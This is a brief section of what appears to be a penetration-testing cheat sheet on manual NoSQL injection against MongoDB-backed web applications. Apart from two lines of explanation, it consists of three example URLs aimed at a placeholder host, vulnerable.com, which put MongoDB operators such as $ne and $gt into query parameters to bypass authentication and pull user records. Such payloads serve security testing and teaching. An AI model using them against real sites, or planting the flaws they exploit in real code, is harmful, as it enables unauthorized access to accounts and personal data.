## Manual Injection

### MongoDB

If the web application uses MongDB, you might be able to fetch the user's information.  
It allows you to bypass authentication.

```sh
https://vulnerable.com/search?username=admin&password[$ne]=xyz
https://vulnerable.com/search?username[$ne]=admin&role=guest
https://vulnerable.com/search?id[$gt]=1&username=mike
```
